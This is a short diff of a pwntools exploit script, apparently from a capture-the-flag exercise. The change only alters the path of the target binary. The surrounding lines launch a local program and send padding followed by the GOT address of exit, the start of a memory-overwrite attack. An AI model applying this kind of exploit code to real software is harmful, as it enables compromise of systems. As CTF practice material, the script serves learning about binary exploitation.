@@ -2,7 +2,7 @@ from pwn import *
 
 context.clear(arch='amd64')
 
-e = ELF('./prog')
+e = ELF('prog')
 
 p = e.process()
 p.sendline('a'*4+p64(e.got.exit))
